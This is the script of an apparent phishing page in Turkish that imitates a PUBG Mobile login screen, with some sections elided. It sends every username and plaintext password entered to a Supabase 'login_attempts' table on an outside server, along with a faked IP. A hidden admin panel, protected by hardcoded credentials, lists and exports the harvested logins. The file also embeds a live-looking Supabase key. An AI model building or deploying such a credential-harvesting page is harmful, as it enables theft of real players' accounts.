<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PUBG Mobile Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <!-- Supabase entegrasyonu için gerekli script -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    /* CSS kodları aynı kalacak, değişiklik yapılmadı */
  </style>
</head>
<body>
  <!-- HTML yapısı aynı kalacak, değişiklik yapılmadı -->

  <script>
    // ÖNEMLİ DEĞİŞİKLİK: Supabase istemcisini doğru şekilde başlatma
    const SUPABASE_URL = 'https://kjkcuccqjdsgxzhxgclb.supabase.co';
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqa2N1Y2NxamRzZ3h6aHhnY2xiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM5OTkxNDQsImV4cCI6MjA2OTU3NTE0NH0.8p6eQMAe6bNHdw7Lt9BPctVlxzakAYg-srwMXwWou_M';
    
    // Supabase istemcisini oluştur
    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const ADMIN_USERNAME = "admin";
    const ADMIN_PASSWORD = "qwerty1234";
    
    // DOM elementleri
    const adminButton = document.getElementById('adminButton');
    const adminPanel = document.getElementById('adminPanel');
    // ... diğer DOM seçicileri ...

    // Admin butonuna tıklama
    adminButton.addEventListener('click', () => {
      // ... kod aynı ...
    });

    // ... diğer event listener'lar ...

    // Giriş denemesini kaydetme fonksiyonu (Supabase'e kaydeder)
    async function saveLoginAttempt(username, password, method, time) {
      // IP adresi simülasyonu
      const ip = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      
      // Supabase'e kaydet (supabaseClient kullanıyoruz)
      const { data, error } = await supabaseClient
        .from('login_attempts')
        .insert([
          { 
            username: username, 
            password: password, 
            method: method, 
            time: time, 
            ip: ip 
          }
        ]);
      
      if (error) {
        console.error('Supabase kayıt hatası:', error);
        throw new Error('Veri kaydedilemedi');
      }
    }
    
    // Admin panelini güncelleme (Supabase'den veri çeker)
    async function updateAdminPanel() {
      adminLoader.style.display = 'block';
      loginData.innerHTML = '';
      logArea.innerHTML = '';
      adminStatus.textContent = 'Veriler yükleniyor...';
      
      try {
        // Supabase'den verileri çek (supabaseClient kullanıyoruz)
        const { data: attempts, error } = await supabaseClient
          .from('login_attempts')
          .select('*')
          .order('id', { ascending: false });
        
        if (error) {
          adminStatus.textContent = 'Veri alınamadı: ' + error.message;
          throw error;
        }
        
        // ... kalan kod aynı ...
      } 
      // ... catch ve finally blokları aynı ...
    }
    
    // Log metni oluşturma (Supabase'den veri çeker)
    async function generateLogText() {
      let logText = "PUBG Mobile Giriş Logları\n";
      logText += "============================\n\n";
      
      try {
        // Supabase'den tüm verileri çek (supabaseClient kullanıyoruz)
        const { data: attempts, error } = await supabaseClient
          .from('login_attempts')
          .select('*')
          .order('id', { ascending: true });
        
        // ... kalan kod aynı ...
      } 
      // ... catch bloğu aynı ...
    }
    
    // Sayfa yüklendiğinde admin panelini güncelle (eğer açıksa)
    window.addEventListener('load', () => {
      if(adminPanel.style.display === 'block') {
        updateAdminPanel();
      }
    });
  </script>
</body>
</html>
